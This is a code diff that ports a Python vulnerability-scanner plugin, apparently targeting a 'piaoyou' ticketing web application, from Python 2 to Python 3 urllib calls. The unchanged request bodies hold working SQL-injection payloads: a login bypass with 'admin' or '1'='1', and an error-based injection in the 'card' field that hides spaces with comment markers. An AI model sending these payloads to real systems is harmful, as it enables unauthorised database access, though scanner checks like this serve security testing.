@@ -5,7 +5,7 @@
 
 import re
 import time
-import urllib
+import urllib.request, urllib.parse, urllib.error
 
 def assign(service, arg):
     if service == 'piaoyou':
@@ -75,7 +75,7 @@ Cache-Control: max-age=0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 376
 
-__VIEWSTATE='''+urllib.quote(view[0])+'''&__EVENTVALIDATION='''+urllib.quote(event[0])+'''&aname=admin%27+or+%271%27%3D%271&apwd=&str=select+sys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29&Button1=%E6%89%A7%E8%A1%8C'''
+__VIEWSTATE='''+urllib.parse.quote(view[0])+'''&__EVENTVALIDATION='''+urllib.parse.quote(event[0])+'''&aname=admin%27+or+%271%27%3D%271&apwd=&str=select+sys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29&Button1=%E6%89%A7%E8%A1%8C'''
         code, head, body, errcode, final_url = curl.curl2(target, raw=raw)
         if 'c4ca4238a0b923820dcc509a6f75849' in body:
             security_hole(target)
@@ -99,7 +99,7 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 817
 
-__VIEWSTATE='''+urllib.quote(view[0])+'''&__EVENTVALIDATION='''+urllib.quote(event[0])+'''&uc1%24password=&uc1%24tb_confirm=&levelm=%E6%99%AE%E9%80%9A&card=73333%27%29%20and%2f%2a%2a%2f1%3dconvert%28int%2C%28select%2f%2a%2a%2fsys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29%29%29%20and%2f%2a%2a%2f%28%271%27%3d%271&name=1&pwd=32131&lxr=2&sex=%E7%94%B7&phone=3&mobile=9&fax=4&mail=0&qq=55&msn=1&address=6®ok=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C'''
+__VIEWSTATE='''+urllib.parse.quote(view[0])+'''&__EVENTVALIDATION='''+urllib.parse.quote(event[0])+'''&uc1%24password=&uc1%24tb_confirm=&levelm=%E6%99%AE%E9%80%9A&card=73333%27%29%20and%2f%2a%2a%2f1%3dconvert%28int%2C%28select%2f%2a%2a%2fsys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29%29%29%20and%2f%2a%2a%2f%28%271%27%3d%271&name=1&pwd=32131&lxr=2&sex=%E7%94%B7&phone=3&mobile=9&fax=4&mail=0&qq=55&msn=1&address=6®ok=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C'''
         code, head, body, errcode, final_url = curl.curl2(target, raw=raw)
         if 'c4ca4238a0b923820dcc509a6f75849' in body:
             security_hole(target)
